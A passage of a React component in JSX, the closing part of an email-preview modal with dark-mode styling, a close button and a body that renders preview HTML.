            <div className={`sticky top-0 z-10 flex items-center justify-between p-6 border-b ${
              darkMode ? 'bg-gray-900 border-gray-700' : 'bg-white border-gray-200'
            }`}>
              <h3 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                📧 Email Preview
              </h3>
              <button
                onClick={() => setShowPreview(false)}
                className={`p-2 rounded-xl transition-colors ${
                  darkMode ? 'hover:bg-gray-800' : 'hover:bg-gray-100'
                }`}
              >
                <X size={24} className={darkMode ? 'text-gray-400' : 'text-gray-600'} />
              </button>
            </div>
            <div className="p-6">
              <div dangerouslySetInnerHTML={{ __html: getPreviewHTML() }} />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
